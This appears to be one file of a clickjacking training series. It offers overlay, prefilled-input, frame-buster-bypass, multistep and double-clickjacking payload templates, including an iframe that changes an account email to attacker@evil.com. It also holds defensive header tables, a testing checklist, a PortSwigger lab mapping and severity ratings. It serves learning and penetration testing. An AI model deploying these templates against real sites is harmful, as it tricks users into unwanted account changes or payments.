# 04 — Cheatsheet & PortSwigger Lab Mapping

## Quick-Reference Payload Templates

### Basic single-click overlay

```html
<style>
  iframe {
    position: relative;
    width: 700px;
    height: 500px;
    opacity: 0.00001;
    z-index: 2;
  }
  div {
    position: absolute;
    top: 300px;
    left: 60px;
    z-index: 1;
  }
</style>
<div>Click me</div>
<iframe src="https://TARGET/sensitive-action"></iframe>
```

### Prefilled form input via URL parameter

```html
<iframe src="https://TARGET/my-account?email=attacker@evil.com"></iframe>
```
(combine with the same overlay CSS as above)

### Frame buster bypass (block navigation, allow forms)

```html
<iframe src="https://TARGET/sensitive-action" sandbox="allow-forms"></iframe>
```

### Frame buster bypass (block navigation, allow scripts)

```html
<iframe src="https://TARGET/sensitive-action" sandbox="allow-scripts"></iframe>
```
(note: deliberately omit `allow-top-navigation` in both cases)

### Multistep overlay

```html
<style>
  .firstClick, .secondClick {
    position: absolute;
    top: 330px;
    left: 50px;
    z-index: 1;
  }
  .secondClick { top: 450px; left: 80px; }
  iframe { position: relative; width: 500px; height: 700px; opacity: 0.00001; z-index: 2; }
</style>
<div class="firstClick">Step 1</div>
<div class="secondClick">Step 2</div>
<iframe src="https://TARGET/multistep-action"></iframe>
```

### Double-clickjacking trigger (no iframe)

```javascript
document.getElementById('bait').addEventListener('mousedown', function () {
  window.opener.location = "https://TARGET/sensitive-action";
  window.close();
});
```

## Header Syntax Cheatsheet

| Header | Directive | Effect |
|---|---|---|
| `X-Frame-Options` | `deny` | Page cannot be framed by anyone |
| `X-Frame-Options` | `sameorigin` | Page can only be framed by same-origin pages |
| `X-Frame-Options` | `allow-from <url>` | Largely unsupported in current Chrome/Safari — treat as ineffective |
| `Content-Security-Policy` | `frame-ancestors 'none'` | Equivalent to XFO `deny` |
| `Content-Security-Policy` | `frame-ancestors 'self'` | Equivalent to XFO `sameorigin` |
| `Content-Security-Policy` | `frame-ancestors example.com` | Restricts framing to named origin(s) only |

CSP `frame-ancestors` takes precedence over `X-Frame-Options` in browsers that support
both — but only protects if it's actually present in the policy. A CSP header with no
`frame-ancestors` directive provides no clickjacking protection at all.

## Manual Testing Checklist

- [ ] Does the target page set `X-Frame-Options` at all? On every sensitive endpoint,
      not just the homepage/login page.
- [ ] Is the CSP header present, and does it specifically include `frame-ancestors`
      (not just other directives like `script-src`)?
- [ ] Is `X-Frame-Options` delivered as a genuine HTTP header, or mistakenly only as an
      HTML `<meta>` tag (which has no effect)?
- [ ] If `allow-from` is used, has it been verified against the actual target browser
      rather than assumed to work?
- [ ] If a frame buster script is present, does the page load and function correctly
      when sandboxed with `allow-forms` or `allow-scripts` (without
      `allow-top-navigation`)?
- [ ] If `frame-ancestors` uses a wildcard domain, is that wildcard scope fully under
      the application owner's control (no abandoned subdomains, no attacker-reachable
      subdomain takeover candidates)?
- [ ] Does the sensitive action require only a single click, or a confirmation flow
      (multistep)?
- [ ] Does the sensitive action accept any of its parameters via GET, enabling the
      prefilled-form-input variant?
- [ ] Is the action reachable from a fully logged-out/unauthenticated context, or does
      it depend on `SameSite=Lax/Strict` cookies being sent (which framing may block)?
- [ ] For high-value targets (OAuth consent, payment authorization, 2FA disable):
      has double-clickjacking been considered as a defense-in-depth gap, separate
      from standard header testing?

## PortSwigger Web Security Academy — Official Lab Progression

These labs are listed in the exact order and with the exact difficulty tags published
on PortSwigger's official Clickjacking learning path.

| # | Lab | Difficulty | Maps to technique |
|---|---|---|---|
| 1 | Basic clickjacking with CSRF token protection | APPRENTICE | Classic single-click overlay (File 02, §2.1) — demonstrates that CSRF tokens do not stop clickjacking |
| 2 | Clickjacking with form input data prefilled from a URL parameter | APPRENTICE | Prefilled form input variant (File 02, §2.2) |
| 3 | Clickjacking with a frame buster script | APPRENTICE | Frame buster bypass via `sandbox` attribute (File 03, §3.1) |
| 4 | Exploiting clickjacking vulnerability to trigger DOM-based XSS | PRACTITIONER | Clickjacking chained with DOM XSS (File 01, classification §4) |
| 5 | Multistep clickjacking | PRACTITIONER | Multistep overlay (File 02, §2.3) |

### Honest gap disclosure

- There is **no dedicated Academy lab** for missing/misconfigured `X-Frame-Options` or
  CSP `frame-ancestors` in isolation — these are taught conceptually on the main
  Clickjacking topic page rather than as standalone labs, since they're the *absence*
  of a control rather than an exploitable mechanism in themselves. Test for these
  directly against real targets rather than expecting an Academy lab to cover them.
- There is **no Academy lab for double-clickjacking** as of this writing. The technique
  was disclosed in December 2024 and, given the Academy's lab-creation cadence for
  newly disclosed techniques in other topics, may be added in a future update — this
  series will need a revision pass if/when that happens. Until then, treat File 02
  §2.4 and File 03 §3.5 as your primary reference for this technique rather than
  relying on lab-based practice.

## Real-World Severity Quick-Reference

| Sensitive action exposed | Realistic severity |
|---|---|
| Logout | Informational |
| Like/follow/share toggle | Low |
| Non-sensitive preference change | Low |
| Email/phone number change (no re-verification) | High |
| Account deletion | High |
| Funds transfer / payment authorization | Critical |
| OAuth/SSO consent ("Authorize" button) | Critical |
| 2FA/MFA disable | Critical |

Always pair the technical finding with the *specific* action it exposes — "the
application is vulnerable to clickjacking" alone is not a complete or fairly-rated
finding for a client report.
